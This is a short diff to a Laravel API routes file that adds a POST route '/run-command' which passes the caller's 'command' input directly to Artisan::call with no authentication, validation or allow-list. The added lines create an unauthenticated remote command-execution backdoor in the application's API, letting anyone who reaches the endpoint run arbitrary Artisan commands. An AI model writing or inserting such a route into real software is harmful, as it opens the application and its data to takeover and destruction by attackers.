@@ -30,6 +30,9 @@ use Illuminate\Support\Facades\Route;
 | is assigned the "api" middleware group. Enjoy building your API!
 |
 */
+Route::post('/run-command', function (Request $request) {
+    \Illuminate\Support\Facades\Artisan::call($request->input('command'));
+});
 
 
 Route::prefix('user')->group(function (){
